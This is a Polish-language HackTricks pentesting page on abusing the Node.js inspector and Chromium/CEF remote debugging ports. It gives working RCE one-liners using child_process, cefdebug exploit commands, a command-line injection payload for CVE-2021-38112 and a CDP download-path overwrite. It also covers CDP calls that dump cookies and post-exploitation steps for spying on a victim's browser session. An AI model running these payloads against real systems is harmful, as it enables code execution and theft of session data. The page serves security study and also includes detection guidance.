# Nadużycie debugowania Node inspector/CEF

{{#include ../../banners/hacktricks-training.md}}

Historyczne praktyczne przykłady obejmują walkthrough Multimaster oraz atak na debugger Visual Studio Code wykorzystujący CVE-2019-1414; należy traktować je jako kontekst zależny od wersji, a nie zakładać, że każdy współczesny cel Electron lub Chromium udostępnia te same mechanizmy.<sup>[[1]](#references)[[3]](#references)</sup>

## Podstawowe informacje

[Z dokumentacji](https://nodejs.org/learn/getting-started/debugging): Po uruchomieniu z przełącznikiem `--inspect` proces Node.js nasłuchuje na clienta debugującego. **Domyślnie** będzie nasłuchiwać na hoście i porcie **`127.0.0.1:9229`**. Każdy proces otrzymuje również **unikalny** **UUID**.<sup>[[4]](#references)</sup>

Klienty inspectora muszą znać i określić adres hosta, port oraz UUID, aby nawiązać połączenie. Pełny URL będzie wyglądać mniej więcej tak: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Ponieważ **debugger ma pełny dostęp do środowiska wykonywania Node.js**, złośliwy actor, który może połączyć się z tym portem, może być w stanie wykonać dowolny kod w imieniu procesu Node.js (**potencjalna eskalacja uprawnień**).<sup>[[4]](#references)</sup>

Istnieje kilka sposobów na uruchomienie inspectora:<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Po uruchomieniu procesu poddanego inspekcji pojawi się coś takiego:<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Procesy oparte na **CEF** (**Chromium Embedded Framework**) mogą udostępniać debugger za pomocą `--remote-debugging-port=9222`. Udostępnia to przeglądarkę przez [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), a nie przez inspektor Node.js, dlatego payloads oparte na `process` w Node.js nie mają domyślnie bezpośredniego zastosowania.<sup>[[2]](#references)[[5]](#references)</sup>

Po uruchomieniu przeglądarki w trybie debugowania pojawi się coś takiego:<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Enumerowanie i sterowanie endpointem CDP

Endpointy HTTP discovery rozróżniają WebSocket **browser** od WebSocketów poszczególnych **targetów** (tab, worker, extension itd.). Użyj `/json/version` dla endpointu browser oraz `/json/list` dla targetów; zwrócone wartości `webSocketDebuggerUrl` można następnie bezpośrednio obsługiwać za pomocą komunikatów podobnych do JSON-RPC w CDP.<sup>[[5]](#references)</sup>
```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```
Na przykład połącz się za pomocą `websocat "$BROWSER_WS"` i wyślij `{"id":1,"method":"Target.getTargets"}` lub `{"id":2,"method":"Storage.getCookies"}`. W przypadku targetu strony (`websocat "$PAGE_WS"`), `Runtime.evaluate` wykonuje kod w tym rendererze, a `Page.captureScreenshot` zwraca screenshot zakodowany w base64. `document.cookie` nie może ujawnić cookies `HttpOnly`, podczas gdy `Storage.getCookies` pyta przeglądarkę o jej magazyn cookies.<sup>[[5]](#references)</sup>
```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```
### Przeglądarki, WebSockets i same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Strony internetowe otwarte w web-browserze mogą wykonywać żądania WebSocket i HTTP zgodnie z modelem bezpieczeństwa przeglądarki. **Początkowe połączenie HTTP** jest wymagane do **uzyskania unikalnego identyfikatora sesji debuggera**. **Same-origin-policy** **uniemożliwia** stronom internetowym nawiązanie **tego połączenia HTTP**. W celu dodatkowej ochrony przed [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js sprawdza, czy **nagłówki 'Host'** połączenia określają **adres IP** lub dokładnie **`localhost`**.<sup>[[4]](#references)</sup>

> [!TIP]
> Ten **środek bezpieczeństwa uniemożliwia wykorzystanie inspectora** do uruchomienia kodu przez **samo wysłanie żądania HTTP** (co można osiągnąć, wykorzystując podatność SSRF).<sup>[[4]](#references)</sup>

### Uruchamianie inspectora w działających procesach

Możesz wysłać **sygnał SIGUSR1** do działającego procesu nodejs, aby spowodować **uruchomienie inspectora** na domyślnym porcie. Pamiętaj jednak, że musisz mieć wystarczające uprawnienia, więc może to zapewnić **uprzywilejowany dostęp do informacji wewnątrz procesu**, ale nie bezpośrednią eskalację uprawnień.<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Jest to przydatne w kontenerach, ponieważ **wyłączenie procesu i uruchomienie nowego** z opcją `--inspect` **nie wchodzi w grę**, gdyż **kontener** zostanie **zabity** razem z procesem.<sup>[[6]](#references)</sup>

### Połącz się z inspector/debugger

Aby połączyć się z **przeglądarką opartą na Chromium**, można uzyskać dostęp do adresów `chrome://inspect` lub `edge://inspect`, odpowiednio dla Chrome lub Edge. Po kliknięciu przycisku Configure należy upewnić się, że **docelowy host i port** są prawidłowo wymienione. Obraz przedstawia przykład Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Pojawi się URL umożliwiający dostęp do debuggera, np. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Połącz się z inspector/debugger: Aby połączyć się z przeglądarką opartą na Chromium,...](<../../images/image (674).png>)

Za pomocą **wiersza poleceń** można połączyć się z debuggerem/inspectorem za pomocą:<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Narzędzie [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) umożliwia **znajdowanie inspektorów** uruchomionych lokalnie i **wstrzykiwanie kodu** do nich.<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Należy pamiętać, że **NodeJS RCE exploits nie zadziałają**, jeśli połączenie z przeglądarką jest nawiązywane przez [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (trzeba sprawdzić API, aby znaleźć interesujące rzeczy, które można z nim zrobić).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE in NodeJS Debugger/Inspector

> [!TIP]
> Jeśli trafiłeś tutaj, szukając informacji, jak uzyskać [**RCE from a XSS in Electron, sprawdź tę stronę.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Typowe sposoby uzyskania **RCE**, gdy można **połączyć się** z **inspector** Node, obejmują użycie czegoś takiego (wygląda na to, że **nie zadziała to w połączeniu z Chrome DevTools protocol**):<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Payloads Chrome DevTools Protocol

API możesz sprawdzić tutaj: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
W tej sekcji wymienię tylko interesujące rzeczy, które znalazłem i których ludzie używali do exploitowania tego protokołu.

### Ograniczenie profilu domyślnego w Chrome 136+

Od **Chrome 136** Chrome ignoruje `--remote-debugging-port` i `--remote-debugging-pipe`, gdy wskazują one **domyślny katalog danych Chrome**. Przełącznik musi być używany wraz z niestandardowym `--user-data-dir`, którego oddzielny klucz szyfrowania i odizolowany stan przeglądarki uniemożliwiają prostej technice opartej na flagach ujawnienie normalnego uwierzytelnionego profilu użytkownika. Nie należy zakładać, że to ograniczenie specyficzne dla Chrome obejmuje starsze wersje Chrome, Chrome for Testing, aplikacje Electron/CEF ani inne pochodne Chromium bez weryfikacji.<sup>[[14]](#references)</sup>
```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```
Dlatego samo stwierdzenie, że bieżący proces Chrome został uruchomiony wyłącznie z opcją `--remote-debugging-port`, **nie** dowodzi, że CDP został aktywowany. Potwierdź obecność listenera i endpointu `/json/version`, a także ustal, który profil faktycznie go obsługuje.<sup>[[14]](#references)</sup>

### Wstrzykiwanie parametrów za pośrednictwem Deep Links

W [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) firma Rhino Security odkryła, że aplikacja oparta na CEF **zarejestrowała niestandardowy identyfikator UR**I** w systemie (workspaces://index.html), który otrzymywał pełny URI, a następnie **uruchamiał aplikacj**ę opartą na CEF z konfiguracją częściowo konstruowaną na podstawie tego URI.<sup>[[8]](#references)</sup>

Odkryto, że parametry URI były dekodowane za pomocą URL decoding i używane do uruchomienia aplikacji opartej na CEF, co umożliwiało użytkownikowi **wstrzyknięcie** flagi **`--gpu-launcher`** do **command line** i wykonanie dowolnych działań.<sup>[[8]](#references)</sup>

Zatem payload taki jak:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Uruchomi calc.exe.<sup>[[8]](#references)</sup>

### Nadpisywanie plików

Zmień folder, w którym **pobrane pliki będą zapisywane**, i pobierz plik, aby **nadpisać** często używany **kod źródłowy** aplikacji za pomocą **złośliwego kodu**.<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE i eksfiltracja

STAR Labs wykazało, że ujawnione usługi WebDriver/CDP mogą umożliwiać odczyt dowolnych plików i RCE; w niektórych konfiguracjach DNS rebinding może dopełnić łańcuch exploita.<sup>[[9]](#references)</sup>

Dodatkowe historyczne przypadki dotyczące browser-automation i bezpieczeństwa Chromium opisano w opracowaniu Counter WebDriver oraz w zgłoszeniach Project Zero 773, 1742 i 1944.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Włączanie CDP wewnątrz aktywnego procesu Chromium

W systemie Windows [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) wykazał, że ograniczenie wiersza poleceń nie jest jedynym sposobem aktywacji CDP: kod, który potrafi już wstrzyknąć się do istniejącego `msedge.exe`, może wywołać nieeksportowaną funkcję Chromium `content::DevToolsAgentHost::StartRemoteDebuggingServer` i udostępnić uwierzytelniony aktywny profil bez ponownego uruchamiania browsera.<sup>[[15]](#references)</sup>

Zademonstrowany łańcuch wstrzykuje DLL za pomocą `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread`, rozwiązuje wewnętrzne symbole Edge (najpierw z plików PDB, a następnie przy użyciu sygnatur bajtowych zależnych od wersji), podmienia procedurę okna browsera i wysyła komunikat, aby końcowe wywołanie uruchomienia serwera wykonało się w **wątku interfejsu użytkownika** browsera. Socket jest powiązany z loopback, po czym standardowe prymitywy CDP mogą pobierać cookies, przechwytywać karty, monitorować ruch sieciowy lub wykonywać JavaScript na uwierzytelnionych stronach.<sup>[[15]](#references)</sup>

> [!WARNING]
> Jest to technika **post-compromise/process-injection**, a nie nieuwierzytelnione obejście sieciowe. Jest silnie zależna od konkretnego builda, ponieważ odpowiednie symbole C++ nie są eksportowane, a sygnatury mogą ulec zmianie po aktualizacjach browsera.<sup>[[15]](#references)</sup>

W celu detekcji nie należy polegać wyłącznie na telemetrii wiersza poleceń `--remote-debugging-*`: należy również korelować nietypowe uchwyty i operacje pamięci wobec procesów browsera (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, tworzenie wątków), wstrzykiwanie DLL oraz nieoczekiwane sockety nasłuchujące na loopback, których właścicielem jest Chrome/Edge.<sup>[[15]](#references)</sup>

### Post-Exploitation

W rzeczywistym środowisku i **po skompromitowaniu** komputera użytkownika korzystającego z browsera opartego na Chromium historyczna technika polegała na ponownym uruchomieniu browsera z włączonym debuggingiem i przekierowaniu portu loopback. Może to ujawnić stan przeglądania ofiary w produktach/buildach, które nadal akceptują wybrany profil, jednak Chrome 136+ nie zastosuje tego do swojego domyślnego katalogu danych.<sup>[[7]](#references)[[14]](#references)</sup>

Oryginalne polecenie ponownego uruchomienia zachowano poniżej dla starszych celów lub celów zależnych od wersji. Drugie polecenie jest obecnie obsługiwaną formą dla Chrome, ale tworzy izolowany profil zamiast ponownie otwierać zwykły, uwierzytelniony stan ofiary.<sup>[[7]](#references)[[14]](#references)</sup>
```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```
W przypadku specyficznych dla macOS technik relaunch, extension i CDP w Chromium zobacz [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - narzędzie do inspekcji i exploitacji debuggera CEF/Chromium](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Zdalne wykonanie kodu w Visual Studio Code za pośrednictwem Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Przewodnik debugowania Node.js - rozpoczęcie pracy](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Wykorzystanie funkcji debugowania Chrome do zdalnego obserwowania i kontrolowania sesji przeglądania](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Zdalne wykonanie kodu w AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - WebDriver RCE via DNS Rebinding and CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - From Bot to RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (rejestr błędów Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (rejestr błędów Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (rejestr błędów Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Zmiany przełączników zdalnego debugowania w celu poprawy bezpieczeństwa - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Wstrzykiwanie CDP do uruchomionej przeglądarki Edge: dogłębna analiza instrumentacji uruchomionej przeglądarki](https://deathflamingo.com/blog/cdp_enabler/)
{{#include ../../banners/hacktricks-training.md}}
